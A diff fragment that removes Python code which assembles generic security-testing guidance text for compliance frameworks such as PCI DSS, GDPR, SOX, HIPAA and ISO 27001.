-        
-        # Compliance Risk Guidance
-        if compliance_risk:
-            compliance_guidance = "\nCOMPLIANCE FOCUS:"
-            if 'PCI DSS' in compliance_risk.upper():
-                compliance_guidance += "\n- Test payment card data protection and processing security"
-                compliance_guidance += "\n- Validate cardholder data encryption and access controls"
-            if 'GDPR' in compliance_risk.upper():
-                compliance_guidance += "\n- Test personal data protection and consent mechanisms"
-                compliance_guidance += "\n- Validate data subject rights and privacy controls"
-            if 'SOX' in compliance_risk.upper():
-                compliance_guidance += "\n- Test financial reporting controls and audit trail integrity"
-                compliance_guidance += "\n- Validate executive certification and internal controls"
-            if 'HIPAA' in compliance_risk.upper():
-                compliance_guidance += "\n- Test health information protection and access controls"
-                compliance_guidance += "\n- Validate patient data privacy and security safeguards"
-            if 'ISO 27001' in compliance_risk.upper():
-                compliance_guidance += "\n- Test information security management controls"
-                compliance_guidance += "\n- Validate risk management and security framework implementation"
-            
-            if len(compliance_guidance) > len("\nCOMPLIANCE FOCUS:"):
-                guidance_sections.append(compliance_guidance)
-        
-        # Combine all guidance sections
-        if guidance_sections:
-            return "\n\nSTRATEGIC TESTING GUIDANCE:" + "".join(guidance_sections)
-        else:
-            return "\n\nSTRATEGIC TESTING GUIDANCE:\n- Apply standard security testing methodologies"
+
